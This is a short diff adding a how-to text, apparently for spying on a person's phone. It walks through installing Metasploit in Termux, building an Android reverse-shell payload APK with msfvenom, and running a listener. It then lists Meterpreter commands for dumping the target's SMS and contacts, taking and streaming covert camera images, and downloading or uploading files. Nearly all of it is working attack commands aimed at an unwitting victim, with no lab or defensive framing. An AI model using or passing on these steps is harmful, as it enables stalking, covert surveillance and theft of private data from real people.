@@ -1,0 +1,48 @@
+Remember when you try to login target Account on your Android, target Account will be logged out. and target will know there's someone login to his/her WhatsApp account on other Phone
+
+okay go to step, type in termux :
+#Installing Metasploit on termux
+$ pkg install unstable-repo
+$ pkg install metasploit
+
+#Making Payload
+$ msfvenom -p android/meterpreter/reverse_tcp lhost=Your_IP lport=4444/whatever R > Payload.apk
+
+#run console
+$ msfconsole
+
+#on console
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost your_ip_same_as_first
+msf5 exploit(multi/handler) > set lport same_as_first
+msf5 exploit(multi/handler) > exploit
+
+#in this moment wait for target connection, if target has open the payload(app) terminal will see like this 
+
+meterpreter# 
+
+to steal message you can type:
+
+meterpreter# dump_sms
+
+that's all.
+
+*more*
+
+#steal contact
+meterpreter# dump_contacts
+
+#take snapshot camera
+meterpreter# webcam_snap -i 1/2
+
+(1. back camera, 2. front camera)
+
+#stream camera
+meterpreter# webcam_stream -i 1/2
+
+#steal data/upload data
+meterpreter# download file_name
+meterpreter# upload file_name
+
+for more u can type help
